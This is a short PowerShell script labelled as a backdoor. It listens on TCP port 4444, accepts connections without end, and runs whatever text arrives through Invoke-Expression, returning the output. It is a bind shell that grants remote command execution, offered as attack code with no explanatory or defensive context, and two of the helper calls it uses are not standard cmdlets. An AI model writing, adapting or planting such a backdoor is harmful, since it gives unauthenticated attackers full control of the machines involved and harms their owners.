# PowerShell backdoor
$listener = [System.Net.Sockets.TcpListener]::new(4444)
$listener.Start()

while($true) {
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    
    # Execute commands from remote
    $command = Read-String $stream
    $result = Invoke-Expression $command
    Write-String $stream $result
}
